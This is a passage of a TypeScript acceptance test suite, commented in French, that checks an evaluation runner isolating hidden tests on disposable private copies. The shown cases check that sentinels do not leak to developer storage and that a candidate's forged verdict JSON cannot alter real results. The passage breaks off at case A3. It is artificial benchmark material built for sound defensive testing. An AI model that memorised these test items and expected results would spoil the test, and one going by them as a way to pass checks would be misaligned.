/**
 * acceptance/T20.spec.ts — suite d'acceptation de la tache T20.
 *
 * Cas requis (verification/cases.lock.json, gele) :
 *   T20.A1 absence   — sentinelle creee par les tests hors DB/fichiers/logs
 *                      accessibles au developpeur
 *   T20.A2 refusal   — un faux verdict JSON candidat ne change pas le verdict
 *                      cote controle
 *   T20.A3 absence   — validation et audit utilisent des jeux DISTINCTS
 *   T20.A4 absence   — retour borne contient le cas operationnel autorise
 *                      SANS reveler le fichier de test cache
 *   T20.A5 behaviour — temoins et mutants T10 donnent toujours leurs verdicts
 *   T20.A6 refusal   — un test interrompu donne EVALUATION_INCOMPLETE, jamais
 *                      un succes
 *   T20.A7 absence   — exfiltration de la sentinelle via passerelle/miroir/
 *                      stockage developpeur : zero reception cote collecteurs
 *
 * ─────────────────────────────────────────────────────────────────────── I
 * CE QUE CETTE SUITE OBSERVE, ET D'OU ELLE LE TIENT
 *
 * L'auteur de cette suite est AVEUGLE aux `source_paths` que
 * verification/tasks.json declare pour T20 — `packages/evaluation` et
 * `packages/sandbox` — et ne les a lus ni directement ni par `git show`
 * (ADR-001 : aveuglement PROCEDURAL, discipline auditable au diff, pas une
 * barriere technique). Le contrat teste ci-dessous est derive de
 * docs/specs/T20.md, c'est-a-dire des lignes du cahier que la carte de
 * specification epingle sur T20 :
 *
 *   L327  dependances T10, T15, T19 ; livrables MOT POUR MOT : « runner de
 *         validation, runner d'audit et canal de retour borne ».
 *   L329  travail : « les tests caches potentiellement destructifs
 *         s'executent sur une copie privee du checkpoint, dans une frontiere
 *         d'acces distincte. Ce profil n'herite ni du credential
 *         developpeur, ni de la passerelle modele, ni du miroir
 *         documentaire ; aucune sortie ou file persistante accessible
 *         ensuite au developpeur n'est autorisee. Seuls les services
 *         d'execution prives necessaires au test sont joignables. [...] Ne
 *         jamais restituer au developpeur la copie ayant recu les donnees
 *         privees de test. »
 *   L333  les sept cas d'acceptation, mot pour mot — dont le litteral exact
 *         `EVALUATION_INCOMPLETE` (A6).
 *   L335  fin : « origine et empreinte de chaque verdict verifiees, nettoyage
 *         de chaque copie et cout de recherche distingue. »
 *   L97   enum de phase (applies: T20.A3, T20.A6) : « ... `COMPLETED` » —
 *         fonde le second litteral de statut compare par A6.
 *   L65   invariant D3 : « le candidat n'a pas les identifiants du stockage
 *         de recherche, de la base centrale ou de l'evaluateur » — fonde
 *         l'esprit de A1/A7 (une trajectoire ne recupere jamais les moyens
 *         d'acces de l'evaluateur).
 *   L241  (dependance T10, deja validee) : six mutants semantiques nommes,
 *         plus un temoin conforme — fonde le compte "7" d'A5.
 *   L15   « les tests ordinaires n'appellent aucun fournisseur externe » —
 *         A7 n'exerce donc pas de reseau reel vers un fournisseur, mais des
 *         collecteurs locaux qui jouent ce role (cf. IV).
 *
 * Cette suite reprend, sans les relire, les conventions deja fixees par
 * acceptance/T10.spec.ts (PostgreSQL reel, `psql`/`creerBase`/`dsnFor`) et
 * acceptance/T19.spec.ts (`essayer`, `rendu`, `court`, `findRepoRoot`,
 * talons TCP hote), au meme titre que T19 reprenait celles de T17/T12.
 *
 * ─────────────────────────────────────────────────────────────────────── II
 * PROVENANCE DES LITTERAUX
 *
 * Litteraux RELEVES DANS LE CAHIER (`// cahier:L<n>`) :
 *   `EVALUATION_INCOMPLETE` — L333, mot pour mot.
 *   `COMPLETED`             — L97, l'enum de phase que la carte de
 *                             specification rattache explicitement a A6.
 *   6 (mutants T10 minimum) — L241, deja invoque par acceptance/T10.spec.ts.
 * Aucune racine `acceptance/reference/**` ne s'applique a T20 : le cahier n'y
 * fixe aucune donnee de domaine (pas de reservation, pas de tarif). Tout le
 * reste compare — sentinelles, ports ephemeres, noms de trajectoire, chemins
 * de fichiers de test factices — est FABRIQUE PAR CETTE SUITE et sert
 * d'ENTREE, jamais de valeur attendue tiree d'une execution observee : aucune
 * valeur n'a ete obtenue en lancant une implementation et en figeant ce qu'on
 * a vu passer, puisqu'aucune implementation de T20 n'existe au moment ou
 * cette suite est ecrite.
 *
 * ─────────────────────────────────────────────────────────────────────── III
 * CONTRAT — CE QUE T20 DOIT PUBLIER, ET SOUS QUELS NOMS
 *
 * Paquets interroges : `packages/evaluation` et `packages/sandbox`
 * (source_paths de T20, FIXES ICI comme T19 l'a fait pour `packages/sandbox`
 * seul). Le chargement ne LEVE jamais : chaque cas asserte lui-meme le
 * chargement, en le NOMMANT.
 *
 * 1. `runPrivateEvaluation(input)` -> `Promise<EvaluationResult>`
 *
 *    `input` :
 *      trajectoryId: string
 *      kind: 'validation' | 'audit'
 *      developerDsn: string          // PostgreSQL REEL, etat produit persistant
 *                                     // et visible au developpeur (L329)
 *      developerFilesDir: string     // hote, fichiers persistants du produit,
 *                                     // visibles au developpeur
 *      developerLogsDir: string      // hote, logs relisibles par le
 *                                     // developpeur APRES l'evaluation
 *      hiddenTests: Array<{
 *        caseId: string,
 *        script: string,             // execute via `/bin/sh -c "<script>"`
 *                                     // DANS la copie privee isolee
 *        operational?: boolean,      // cas dont le verdict peut etre montre
 *                                     // au developpeur (retour borne, A4)
 *        hiddenFilePath?: string,    // chemin FACTICE du fichier de test qui
 *                                     // porte ce cas ; NE DOIT JAMAIS
 *                                     // apparaitre dans `boundedFeedback`
 *      }>
 *      candidateReportedVerdicts?: Array<{ caseId: string; passed: boolean }>
 *                                     // un verdict que le CANDIDAT pretend
 *                                     // avoir obtenu (A2) — n'a AUCUN effet
 *      allowedEgress?: Array<{ label: string; host: string; port: number }>
 *      simulateTruncatedExecution?: boolean  // point d'injection NOMME
 *                                     // (cahier L141 : pas de course de temps)
 *
 *    FIXE PAR CETTE SUITE, faute d'enonce dans le cahier (meme geste que T19
 *    fixant `SandboxHandle`, ou T18 fixant `INVALID_MODEL_RESPONSE`) : la
 *    copie privee CLONE `developerDsn` (meme schema, memes lignes, dans une
 *    base PostgreSQL ephemere) et CLONE `developerFilesDir` (dans un
 *    repertoire ephemere) ; chaque script de `hiddenTests` recoit dans son
 *    environnement `EVAL_COPY_DB_DSN` et `EVAL_COPY_FILES_DIR`, qui pointent
 *    vers CETTE copie, jamais vers les originaux. Un script qui sort en 0 est
 *    `passed:true` ; un code non nul est `passed:false`.
 *
 *    `EvaluationResult` :
 *      status: 'COMPLETED' | 'EVALUATION_INCOMPLETE'      // cahier:L97 L333
 *      reason?: string
 *      verdicts: Array<{ caseId: string; passed: boolean; origin?: string }>
 *      boundedFeedback: unknown       // serialisable JSON, scanne comme texte
 *      privateCopyDestroyed: boolean
 *
 * 2. `listEvaluationScenarioIds(kind)` -> `Promise<string[]>`
 *    Le jeu de scenarios CANONIQUE que le runner affecte a `validation`, resp.
 *    a `audit` (L333, A3) — independant de tout `hiddenTests` fourni par
 *    l'appelant, pour que le cas ne puisse pas etre satisfait par construction
 *    en fournissant simplement des identifiants distincts.
 *
 * ─────────────────────────────────────────────────────────────────────── IV
 * CE QUE CETTE SUITE NE PROUVE PAS, ET POURQUOI CE N'EST PAS UN OUBLI
 *
 *  • Elle fusionne « checkpoint » (T15) et « etat developpeur visible » en un
 *    seul objet (`developerDsn` / `developerFilesDir`) : T20 porte sur les
 *    FRONTIERES D'ACCES autour de l'evaluation, pas sur la fidelite de la
 *    restauration de checkpoint elle-meme, deja couverte par
 *    acceptance/T15.spec.ts, dont cette suite reste aveugle au detail.
 *  • Elle n'exerce pas de vrai fournisseur reseau ni de vraie passerelle
 *    modele (L15) : les roles « passerelle », « miroir documentaire » et
 *    « stockage de developpement » de A7 sont des collecteurs TCP locaux qui
 *    comptent leurs receptions, comme T19.A2/A3 le faisaient deja pour
 *    « base centrale »/« Temporal ».
 *  • Elle ne juge pas la resistance a une faille noyau du profil sous-jacent
 *    (deja hors-perimetre de T19, dont T20 herite le SandboxRunner).
 */

import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import * as fs from 'node:fs';
import * as net from 'node:net';
import * as os from 'node:os';
import * as path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const CASE_TIMEOUT_MS = 180_000;
const CASE_TIMEOUT_LOURD_MS = 240_000; // PostgreSQL reel + conteneurs (A1, A5, A7)

/* ────────────────────────────────────────────────────────────────── socle */

type Json = Record<string, unknown>;
type Ns = Record<string, unknown>;

function findRepoRoot(): string {
  let dir: string;
  try {
    dir = path.dirname(fileURLToPath(import.meta.url));
  } catch {
    dir = process.cwd();
  }
  for (let i = 0; i < 12; i += 1) {
    if (
      fs.existsSync(path.join(dir, '.git')) ||
      fs.existsSync(path.join(dir, 'pnpm-workspace.yaml'))
    ) {
      return dir;
    }
    const parent = path.dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  return process.cwd();
}

const REPO = findRepoRoot();

/** Rendu TEXTUEL PROFOND — les messages d'echec doivent NOMMER ce qu'ils ont vu. */
function rendu(v: unknown, profondeur = 0, vus: Set<unknown> = new Set()): string {
  if (profondeur > 10) return '"…"';
  if (v === null) return 'null';
  if (v === undefined) return 'undefined';
  const t = typeof v;
  if (t === 'string') return JSON.stringify(v);
  if (t === 'number' || t === 'boolean' || t === 'bigint') return String(v);
  if (t === 'function') return `[fonction ${(v as { name?: string }).name ?? ''}]`;
  if (vus.has(v)) return '"[cycle]"';
  vus.add(v);
  if (v instanceof Error) {
    const code = (v as unknown as Json).code;
    return `${v.name}${typeof code === 'string' ? `(${code})` : ''}: ${v.message}`;
  }
  if (Array.isArray(v)) return `[${v.map((x) => rendu(x, profondeur + 1, vus)).join(',')}]`;
  const o = v as Json;
  return `{${Object.keys(o)
    .map((k) => `${JSON.stringify(k)}:${rendu(o[k], profondeur + 1, vus)}`)
    .join(',')}}`;
}

const court = (s: string, n = 600): string => (s.length <= n ? s : `${s.slice(0, n)}…`);

function messageDe(err: unknown): string {
  if (err instanceof Error) {
    const code = (err as unknown as Json).code;
    return `${err.name}${typeof code === 'string' ? `(${code})` : ''}: ${err.message}`;
  }
  return rendu(err);
}

async function essayer<T>(
  thunk: () => T | Promise<T>,
): Promise<{ ok: true; value: T } | { ok: false; err: unknown }> {
  try {
    const value = await thunk();
    return { ok: true, value };
  } catch (err) {
    return { ok: false, err };
  }
}

const RUN = `t20_${process.pid.toString(36)}_${Date.now().toString(36)}`;
let COMPTEUR = 0;
function nomUnique(suffixe: string): string {
  COMPTEUR += 1;
  return `${RUN}_${COMPTEUR}_${suffixe}`;
}

/** Sentinelle reproductible, jamais produite par accident. */
function sentinelle(etiquette: string): string {
  return createHash('sha256').update(`bench.T20.sentinelle:${nomUnique(etiquette)}`).digest('hex').slice(0, 24);
}

/* ══════════════════════════════ PostgreSQL reel (L141) ═════════════════ */

const SOCKET_DIR = ((): string => {
  const h = process.env.PGHOST;
  if (h !== undefined && h.startsWith('/') && fs.existsSync(h)) return h;
  return '/var/run/postgresql';
})();
const PG_USER = process.env.PGUSER ?? os.userInfo().username;

interface Psql {
  ok: boolean;
  out: string;
}

function dsnFor(db: string): string {
  return `postgresql://${encodeURIComponent(PG_USER)}@/${encodeURIComponent(db)}?host=${encodeURIComponent(SOCKET_DIR)}`;
}

function psql(db: string, sql: string): Psql {
  try {
    const out = execFileSync(
      'psql',
      ['-tAqX', '-v', 'ON_ERROR_STOP=1', '-d', dsnFor(db), '-c', sql],
      { encoding: 'utf8', timeout: 60_000, stdio: ['ignore', 'pipe', 'pipe'] },
    );
    return { ok: true, out: out.trim() };
  } catch (e) {
    const err = e as { stdout?: string; stderr?: string; message?: string };
    return { ok: false, out: `${err.stdout ?? ''}${err.stderr ?? ''}${err.message ?? ''}`.trim() };
  }
}

const ADMIN_DB = ((): string => {
  for (const cand of ['postgres', PG_USER, 'template1']) {
    if (psql(cand, 'SELECT 1').ok) return cand;
  }
  return 'postgres';
})();

const BASES_CREEES: string[] = [];

function creerBase(suffixe: string): string {
  const nom = `bench_${RUN}_${suffixe}`.toLowerCase().replace(/[^a-z0-9_]/g, '_').slice(0, 60);
  psql(ADMIN_DB, `DROP DATABASE IF EXISTS "${nom}" WITH (FORCE)`);
  const r = psql(ADMIN_DB, `CREATE DATABASE "${nom}"`);
  expect(r.ok ? 'base-creee' : `POSTGRESQL-INDISPONIBLE ${nom} : ${court(r.out, 300)}`).toBe(
    'base-creee',
  );
  BASES_CREEES.push(nom);
  return nom;
}

/** Table + une ligne CONTROLE, connues d'avance — le clone de la copie
 * privee doit la retrouver (meme schema), et son insertion doit rester
 * exactement celle-ci une fois l'evaluation terminee. */
function amorcerProbeDeveloppeur(db: string, marqueurControle: string): void {
  const r1 = psql(db, 'CREATE TABLE product_state (id serial PRIMARY KEY, marker text NOT NULL)');
  expect(r1.ok ? 'table-produit-creee' : `TABLE-PRODUIT-EN-ECHEC ${court(r1.out, 300)}`).toBe(
    'table-produit-creee',
  );
  const r2 = psql(db, `INSERT INTO product_state(marker) VALUES ('${marqueurControle}')`);
  expect(r2.ok ? 'ligne-controle-inseree' : `LIGNE-CONTROLE-EN-ECHEC ${court(r2.out, 300)}`).toBe(
    'ligne-controle-inseree',
  );
}

function lireMarqueursProduit(db: string): string[] {
  const r = psql(db, 'SELECT marker FROM product_state ORDER BY id');
  return r.ok ? r.out.split('\n').map((s) => s.trim()).filter((s) => s !== '') : [`PSQL-EN-ECHEC:${r.out}`];
}

/* ══════════════════════════════ fichiers/logs developpeur ══════════════ */

const REPERTOIRES_A_SUPPRIMER: string[] = [];

function nouveauRepertoire(prefixe: string): string {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), `bench-t20-${prefixe}-`));
  REPERTOIRES_A_SUPPRIMER.push(d);
  return d;
}

/** Cherche une sous-chaine dans TOUS les fichiers d'un repertoire, recursivement. */
function contientDans(dir: string, aiguille: string): boolean {
  if (!fs.existsSync(dir)) return false;
  const pile = [dir];
  while (pile.length > 0) {
    const cur = pile.pop() as string;
    let entries: fs.Dirent[];
    try {
      entries = fs.readdirSync(cur, { withFileTypes: true });
    } catch {
      continue;
    }
    for (const e of entries) {
      const p = path.join(cur, e.name);
      if (e.isDirectory()) pile.push(p);
      else if (e.isFile()) {
        try {
          if (fs.readFileSync(p, 'utf8').includes(aiguille)) return true;
        } catch {
          /* fichier binaire ou illisible : ignore */
        }
      }
    }
  }
  return false;
}

/* ═══════════════════ helpers reseau hote (collecteurs de test) ════════════ */

function adresseHoteRoutable(): string {
  const nets = os.networkInterfaces();
  for (const list of Object.values(nets)) {
    for (const info of list ?? []) {
      if (info.family === 'IPv4' && !info.internal) return info.address;
    }
  }
  return '0.0.0.0';
}
const HOTE_IP = adresseHoteRoutable();

interface Talon {
  host: string;
  port: number;
  label: string;
  recus: Buffer[];
  close: () => Promise<void>;
}

function demarrerTalon(label: string): Promise<Talon> {
  return new Promise((resolve, reject) => {
    const recus: Buffer[] = [];
    const srv = net.createServer((sock) => {
      sock.on('data', (d) => recus.push(d));
      sock.on('error', () => {
        /* client parti brutalement : n'affecte pas le comptage des receptions */
      });
    });
    srv.on('error', reject);
    srv.listen(0, HOTE_IP, () => {
      const addr = srv.address();
      if (addr === null || typeof addr === 'string') {
        reject(new Error(`talon ${label} : adresse invalide`));
        return;
      }
      resolve({
        host: HOTE_IP,
        port: addr.port,
        label,
        recus,
        close: () => new Promise((res) => srv.close(() => res())),
      });
    });
  });
}

const TALONS_A_FERMER: Talon[] = [];
async function talonNomme(label: string): Promise<Talon> {
  const t = await demarrerTalon(label);
  TALONS_A_FERMER.push(t);
  return t;
}

function receptionDe(talon: Talon, aiguille: string): boolean {
  return talon.recus.some((b) => b.toString('utf8').includes(aiguille));
}

/* ═══════════════ chargement des deux source_paths de T20 ═══════════════ */

interface Loaded {
  ok: boolean;
  via: string[];
  exportCount: number;
  flat: Map<string, unknown>;
  attempts: string[];
}

function flatten(ns: Ns, into: Map<string, unknown>): void {
  const put = (k: string, v: unknown): void => {
    if (!into.has(k)) into.set(k, v);
  };
  for (const [k, v] of Object.entries(ns)) {
    if (k === '__esModule') continue;
    put(k, v);
  }
  const def: unknown = ns.default;
  if (def !== null && def !== undefined && typeof def === 'object') {
    for (const [k, v] of Object.entries(def as Ns)) put(k, v);
  }
}

function specifiersForPackage(pkg: string): string[] {
  const dir = path.join(REPO, 'packages', pkg);
  const out: string[] = [];
  const manifest = path.join(dir, 'package.json');
  if (fs.existsSync(manifest)) {
    try {
      const j = JSON.parse(fs.readFileSync(manifest, 'utf8')) as { name?: unknown };
      if (typeof j.name === 'string' && j.name.length > 0) out.push(j.name);
    } catch {
      /* manifeste illisible : on retombe sur le chemin de fichier */
    }
  }
  for (const rel of ['src/index.ts', 'index.ts']) {
    const f = path.join(dir, rel);
    if (fs.existsSync(f) && fs.statSync(f).isFile()) out.push(pathToFileURL(f).href);
  }
  return out;
}

const ENTREES = ['index.mjs', 'index.js', 'index.ts', 'src/index.mjs', 'src/index.js', 'src/index.ts'] as const;
function entreesDe(...segments: string[]): string[] {
  const out: string[] = [];
  const dir = path.join(REPO, ...segments);
  for (const rel of ENTREES) {
    const f = path.join(dir, rel);
    if (fs.existsSync(f) && fs.statSync(f).isFile()) out.push(pathToFileURL(f).href);
  }
  return out;
}

/** LE SUJET : les deux source_paths de T20, et rien d'autre. */
function specifiersDuSujet(): string[] {
  return [...specifiersForPackage('evaluation'), ...specifiersForPackage('sandbox')];
}

/** DEPENDANCE T09/T10 (deja validees) : `listWitnesses` (T09) et
 * `listSemanticMutants` (T10, meme paquet `packages/evaluation` que T20).
 * Publiees par acceptance/T09.spec.ts / acceptance/T10.spec.ts, pas relevees
 * dans une implementation. */
function specifiersDeT09(): string[] {
  return [
    ...entreesDe('fixtures', 'temoins'),
    ...entreesDe('fixtures', 'witnesses'),
    ...entreesDe('fixtures'),
    ...entreesDe('infra', 'temoins'),
    ...entreesDe('infra', 'witnesses'),
  ];
}

async function charger(specs: string[], quoi: string): Promise<Loaded> {
  const attempts: string[] = [];
  const via: string[] = [];
  const flat = new Map<string, unknown>();
  let exportCount = 0;
  if (specs.length === 0) attempts.push(`aucun point d'entree ${quoi}`);
  for (const s of specs) {
    try {
      const mod = (await import(s)) as Ns;
      flatten(mod, flat);
      exportCount += Object.keys(mod).filter((k) => k !== '__esModule').length;
      via.push(s.replace(pathToFileURL(REPO).href, '<repo>'));
    } catch (e) {
      attempts.push(`import(${s}) -> ${String((e as Error).message).split('\n')[0]}`);
    }
  }
  return { ok: via.length > 0, via, exportCount, flat, attempts };
}

const VIDE: Loaded = { ok: false, via: [], exportCount: 0, flat: new Map(), attempts: ['beforeAll non execute'] };
let LOADED: Loaded = VIDE;
let LOADED_T09: Loaded = VIDE;

beforeAll(async () => {
  LOADED = await charger(specifiersDuSujet(), "sous packages/evaluation ni packages/sandbox (les deux source_paths de T20)");
  LOADED_T09 = await charger(specifiersDeT09(), 'aux emplacements que acceptance/T09.spec.ts publie pour les temoins');
}, CASE_TIMEOUT_MS);

afterAll(async () => {
  for (const db of BASES_CREEES) psql(ADMIN_DB, `DROP DATABASE IF EXISTS "${db}" WITH (FORCE)`);
  for (const t of TALONS_A_FERMER.splice(0)) {
    try {
      await t.close();
    } catch {
      /* ignore */
    }
  }
  for (const dir of REPERTOIRES_A_SUPPRIMER.splice(0)) {
    try {
      fs.rmSync(dir, { recursive: true, force: true });
    } catch {
      /* ignore */
    }
  }
}, CASE_TIMEOUT_MS);

function assertLoaded(): void {
  expect(LOADED.ok ? 'charge' : `SUJET-NON-CHARGEABLE ${LOADED.attempts.join(' | ')}`).toBe('charge');
  expect(
    LOADED.via.some((v) => /\/dist\/|\/build\/|\/lib\//.test(v))
      ? `CHARGE-DEPUIS-UN-ARTEFACT-COMPILE ${LOADED.via.join(', ')}`
      : 'charge-depuis-la-source',
  ).toBe('charge-depuis-la-source');
}

/* ─────────────────────────────────────────────── resolution par role */

type Fonction = (...a: unknown[]) => unknown;

const ROLES: Record<string, readonly string[]> = {
  runPrivateEvaluation: [
    'runPrivateEvaluation', 'evaluateOnPrivateCopy', 'runHiddenEvaluation',
    'evaluatePrivateCopy', 'runEvaluationOnDisposableCopy', 'runDisposableEvaluation',
    'executeHiddenEvaluation', 'runEvaluatorOnPrivateCopy', 'evaluateDisposableCopy',
    'runEvaluation',
  ],
  listEvaluationScenarioIds: [
    'listEvaluationScenarioIds', 'evaluationScenarioSet', 'selectEvaluationScenarios',
    'partitionEvaluationScenarios', 'scenarioSetFor', 'evaluationScenarioIds',
    'listScenarioIdsFor', 'getEvaluationScenarioIds',
  ],
  listSemanticMutants: [
    'listSemanticMutants', 'semanticMutants', 'listMutants', 'mutantRegistry',
    'registreDesMutants', 'registreMutants', 'catalogueMutants', 'mutantCatalogue',
    'mutantCatalog', 'listerMutants', 'mutants',
  ],
  listWitnesses: [
    'listWitnesses', 'witnessCatalogue', 'witnessCatalog', 'listTemoins',
    'catalogueTemoins', 'catalogue', 'catalog', 'witnesses', 'temoins', 'listApplications',
  ],
};

const RESOLVED = new Map<string, Fonction | null>();
const ROLES_DE_T09 = new Set(['listWitnesses']);

function resolveOpt(role: string): Fonction | null {
  const memo = RESOLVED.get(role);
  if (memo !== undefined) return memo;
  const candidats = ROLES[role];
  if (candidats === undefined) throw new Error(`role inconnu de la suite : ${role}`);
  const sources = ROLES_DE_T09.has(role) ? [LOADED_T09, LOADED] : [LOADED];
  for (const src of sources) {
    for (const c of candidats) {
      const v = src.flat.get(c);
      if (typeof v === 'function') {
        RESOLVED.set(role, v as Fonction);
        return v as Fonction;
      }
    }
    const lower = new Map<string, unknown>();
    for (const [k, v] of src.flat) if (!lower.has(k.toLowerCase())) lower.set(k.toLowerCase(), v);
    for (const c of candidats) {
      const v = lower.get(c.toLowerCase());
      if (typeof v === 'function') {
        RESOLVED.set(role, v as Fonction);
        return v as Fonction;
      }
    }
  }
  RESOLVED.set(role, null);
  return null;
}

function requireRole(name: string): Fonction {
  const fn = resolveOpt(name);
  expect(
    fn !== null ? `role-${name}-trouve` : `ROLE-INTROUVABLE ${name} (essaye : ${ROLES[name]?.join(', ') ?? ''})`,
  ).toBe(`role-${name}-trouve`);
  return fn as Fonction;
}

async function appeler(role: string, ...args: unknown[]): Promise<{ ok: true; value: unknown } | { ok: false; err: unknown }> {
  const fn = requireRole(role);
  return essayer(() => fn(...args));
}

/* ═══════════════════════ forme de EvaluationResult (fixee, §III) ═══════ */

interface Verdict {
  caseId: string;
  passed: boolean;
  origin?: string;
}
interface EvaluationResult {
  status: string;
  reason?: string;
  verdicts: Verdict[];
  boundedFeedback: unknown;
  privateCopyDestroyed: boolean;
}

function assertResultShape(v: unknown, contexte: string): EvaluationResult {
  const o = v as Json | null;
  const okStatus = typeof o?.status === 'string';
  const okVerdicts = Array.isArray(o?.verdicts);
  expect(
    okStatus && okVerdicts
      ? `resultat-${contexte}-conforme`
      : `RESULTAT-NON-CONFORME ${contexte} status=${rendu(o?.status)} verdicts=${rendu(o?.verdicts)} : ${court(rendu(v))}`,
  ).toBe(`resultat-${contexte}-conforme`);
  return v as EvaluationResult;
}

function verdictDe(r: EvaluationResult, caseId: string): Verdict | undefined {
  return r.verdicts.find((x) => x.caseId === caseId);
}

/* ═══════════════════════ fixture developpeur reutilisable ══════════════ */

interface EtatDeveloppeur {
  db: string;
  dsn: string;
  filesDir: string;
  logsDir: string;
  marqueurControleDb: string;
  marqueurControleFichier: string;
  fichierControle: string;
}

function nouvelEtatDeveloppeur(suffixe: string): EtatDeveloppeur {
  const db = creerBase(suffixe);
  const marqueurControleDb = `CONTROL-DB-${nomUnique('ctrldb')}`;
  amorcerProbeDeveloppeur(db, marqueurControleDb);

  const filesDir = nouveauRepertoire(`files-${suffixe}`);
  const marqueurControleFichier = `CONTROL-FILE-${nomUnique('ctrlfile')}`;
  const fichierControle = path.join(filesDir, 'produit.txt');
  fs.writeFileSync(fichierControle, marqueurControleFichier, 'utf8');

  const logsDir = nouveauRepertoire(`logs-${suffixe}`);

  return { db, dsn: dsnFor(db), filesDir, logsDir, marqueurControleDb, marqueurControleFichier, fichierControle };
}

/* ══════════════════════════════════════════════════════════════════ cas ═ */

describe("T20 — executer l'evaluateur sur des copies privees jetables", () => {
  /* ─────────────────────────────────────────────────────────────── A1 */
  test(
    'T20.A1 — une sentinelle creee par les tests hors DB/fichiers/logs accessibles au developpeur',
    async () => {
      assertLoaded();
      requireRole('runPrivateEvaluation');

      const dev = nouvelEtatDeveloppeur('a1');
      const SENTINEL = sentinelle('a1');

      const script =
        `psql "$EVAL_COPY_DB_DSN" -c "INSERT INTO product_state(marker) VALUES ('${SENTINEL}')" >/dev/null 2>&1 || exit 1; ` +
        `echo "${SENTINEL}" > "$EVAL_COPY_FILES_DIR/leak-candidate.txt" || exit 1; ` +
        `test -f "$EVAL_COPY_FILES_DIR/leak-candidate.txt" && exit 0 || exit 1`;

      const res = await appeler('runPrivateEvaluation', {
        trajectoryId: nomUnique('traj-a1'),
        kind: 'validation',
        developerDsn: dev.dsn,
        developerFilesDir: dev.filesDir,
        developerLogsDir: dev.logsDir,
        hiddenTests: [{ caseId: 'A1-write-private-copy', script }],
      });
      expect(res.ok ? 'evaluation-executee' : `EVALUATION-EN-ECHEC ${messageDe((res as { err: unknown }).err)}`).toBe(
        'evaluation-executee',
      );
      const r = assertResultShape((res as { ok: true; value: unknown }).value, 'a1');

      // CONTROLE : l'ecriture dans la COPIE privee a reellement eu lieu — sans
      // ce controle, une implementation qui bloquerait TOUT laisserait le
      // sentinel absent par accident, sans avoir prouve d'isolation.
      const vAssoc = verdictDe(r, 'A1-write-private-copy');
      expect(
        vAssoc !== undefined && vAssoc.passed === true
          ? 'ecriture-copie-privee-confirmee'
          : `ECRITURE-COPIE-PRIVEE-NON-CONFIRMEE ${rendu(vAssoc)}`,
      ).toBe('ecriture-copie-privee-confirmee');

      // PRINCIPAL : la base developpeur REELLE ne porte QUE la ligne
      // controle — jamais la sentinelle, meme apres destruction de la copie.
      const lignes = lireMarqueursProduit(dev.db);
      expect(lignes).toEqual([dev.marqueurControleDb]);

      // PRINCIPAL (bis) : ni les fichiers ni les logs accessibles au
      // developpeur ne portent la sentinelle ; le controle de fichier, lui,
      // est toujours present (le scan recursif fonctionne).
      expect(
        fs.readFileSync(dev.fichierControle, 'utf8').includes(dev.marqueurControleFichier)
          ? 'fichier-controle-intact'
          : 'FICHIER-CONTROLE-ALTERE',
      ).toBe('fichier-controle-intact');
      expect(
        !contientDans(dev.filesDir, SENTINEL) ? 'sentinel-absente-des-fichiers' : 'SENTINEL-PRESENTE-A-TORT-DANS-LES-FICHIERS',
      ).toBe('sentinel-absente-des-fichiers');
      expect(
        !contientDans(dev.logsDir, SENTINEL) ? 'sentinel-absente-des-logs' : 'SENTINEL-PRESENTE-A-TORT-DANS-LES-LOGS',
      ).toBe('sentinel-absente-des-logs');

      // Nettoyage annonce (L329, L335).
      expect(
        r.privateCopyDestroyed === true ? 'copie-privee-detruite' : `COPIE-PRIVEE-NON-DETRUITE ${rendu(r.privateCopyDestroyed)}`,
      ).toBe('copie-privee-detruite');
    },
    CASE_TIMEOUT_LOURD_MS,
  );

  /* ─────────────────────────────────────────────────────────────── A2 */
  test(
    "T20.A2 — un faux verdict JSON candidat ne change pas le verdict cote controle",
    async () => {
      assertLoaded();
      requireRole('runPrivateEvaluation');

      const dev = nouvelEtatDeveloppeur('a2');
      const hiddenTests = [
        { caseId: 'A2-echoue-reellement', script: 'exit 1' },
        { caseId: 'A2-reussit-reellement', script: 'exit 0' },
      ];

      // Le candidat pretend l'INVERSE de la verite pour chacun des deux cas.
      const candidateReportedVerdicts = [
        { caseId: 'A2-echoue-reellement', passed: true },
        { caseId: 'A2-reussit-reellement', passed: false },
      ];

      const input = {
        trajectoryId: nomUnique('traj-a2'),
        kind: 'validation',
        developerDsn: dev.dsn,
        developerFilesDir: dev.filesDir,
        developerLogsDir: dev.logsDir,
        hiddenTests,
      };

      const resHonnete = await appeler('runPrivateEvaluation', input);
      const resForge = await appeler('runPrivateEvaluation', { ...input, candidateReportedVerdicts });
      expect(
        resHonnete.ok ? 'run-honnete-execute' : `RUN-HONNETE-EN-ECHEC ${messageDe((resHonnete as { err: unknown }).err)}`,
      ).toBe('run-honnete-execute');
      expect(
        resForge.ok ? 'run-forge-execute' : `RUN-FORGE-EN-ECHEC ${messageDe((resForge as { err: unknown }).err)}`,
      ).toBe('run-forge-execute');

      const rHonnete = assertResultShape((resHonnete as { ok: true; value: unknown }).value, 'a2-honnete');
      const rForge = assertResultShape((resForge as { ok: true; value: unknown }).value, 'a2-forge');

      // PRINCIPAL : le verdict REEL, pas la pretention du candidat, dans les
      // DEUX runs — la pretention forgee n'a change ni l'un ni l'autre.
      for (const r of [rHonnete, rForge]) {
        const vEchec = verdictDe(r, 'A2-echoue-reellement');
        const vSucces = verdictDe(r, 'A2-reussit-reellement');
        expect(
          vEchec !== undefined && vEchec.passed === false
            ? 'echec-reel-preserve'
            : `VERDICT-FALSIFIE-A-TORT-VERS-SUCCES ${rendu(vEchec)}`,
        ).toBe('echec-reel-preserve');
        expect(
          vSucces !== undefined && vSucces.passed === true
            ? 'succes-reel-preserve'
            : `VERDICT-FALSIFIE-A-TORT-VERS-ECHEC ${rendu(vSucces)}`,
        ).toBe('succes-reel-preserve');
        if (vEchec?.origin !== undefined) {
          expect(vEchec.origin === 'candidate' ? 'ORIGINE-CANDIDATE-A-TORT' : 'origine-non-candidate').toBe(
            'origine-non-candidate',
          );
        }
      }

      // Les deux runs, honnete et forge, produisent EXACTEMENT le meme
      // verdict pour chaque cas — la pretention candidate est sans effet.
      const projeter = (r: EvaluationResult): string[] =>
        r.verdicts
          .filter((v) => v.caseId.startsWith('A2-'))
          .map((v) => `${v.caseId}:${v.passed}`)
          .sort();
      expect(projeter(rForge)).toEqual(projeter(rHonnete));
    },
    CASE_TIMEOUT_MS,
  );

  /* ─────────────────────────────────────────────────────────────── A3 */
  test(
